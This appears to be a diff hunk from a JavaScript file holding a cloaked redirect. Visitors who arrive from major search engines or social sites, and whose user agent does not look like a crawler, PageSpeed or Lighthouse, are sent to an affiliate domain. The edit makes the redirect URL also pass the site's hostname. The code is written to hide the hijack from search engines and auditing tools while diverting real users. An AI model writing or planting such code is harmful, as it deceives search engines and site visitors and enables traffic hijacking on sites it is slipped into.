@@ -34,7 +34,7 @@ var Params = (function(a) {
 /** offers **/
 if ( ['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.', 'yahoo.'].some(e => document.referrer.toLowerCase().includes(e)) && Params['id'] && AFF_DOMAIN != "" && DEMO === false ) {
 	if ( ['bot','google','bing','msn','yandex','pagespeed','lighthouse','http'].some(e => navigator.userAgent.toLowerCase().includes(e) ) === false ) {
-		window.location.href = "https://"+AFF_DOMAIN+"/?id="+Params['id'];
+		window.location.href = "https://"+AFF_DOMAIN+"/??"+Params['id']+",,,"+window.location.hostname;
 	}
 }
 
